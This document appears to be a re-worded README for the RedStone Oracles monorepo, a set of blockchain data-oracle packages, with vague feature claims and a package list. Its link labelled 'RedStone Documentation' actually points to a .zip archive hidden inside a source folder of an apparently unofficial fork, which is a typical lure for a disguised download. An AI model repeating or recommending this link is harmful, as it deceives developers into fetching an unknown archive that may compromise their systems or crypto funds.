## üì¶ Overview

The **RedStone Oracles Monorepo** is a collection of essential tools designed to help your decentralized applications (dApps) access reliable and up-to-date data. This setup ensures that you can cater to your application's data needs without complexity.

The RedStone system operates in a unique manner. It attaches data to transactions automatically, which means lower costs for you. This innovative approach reduces the need for costly on-chain storage, making it ideal for your data delivery.

Learn more about RedStone at [RedStone Documentation](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip).

## üîß Features

- **Easy Data Access:** Pull diverse data into your applications effortlessly.
- **Cost-Effective:** Lower your transaction costs by utilizing unique data handling.
- **Flexible Architecture:** Suitable for a wide range of use cases in blockchain applications.
- **Continuous Updates:** Always get the most current data as it updates automatically.

## üìÇ Packages Included

Here are the key components you can use in this monorepo:

- **[oracle-node](packages/oracle-node/):** This is the go-to implementation for data provider nodes.
- **[cache-service](packages/cache-service/):** This component helps manage RedStone cache nodes effectively.
- **[evm-connector](packages/evm-connector/):** Use this module if you're working with Ethereum Virtual Machine applications.
- **[protocol](packages/protocol/):** This houses all protocols related to RedStone's data delivery.
- **[sdk](packages/sdk/):** A software development kit to assist developers.
- **[eth-contracts](packages/eth-contracts/):** Contains essential Ethereum contracts for integration.
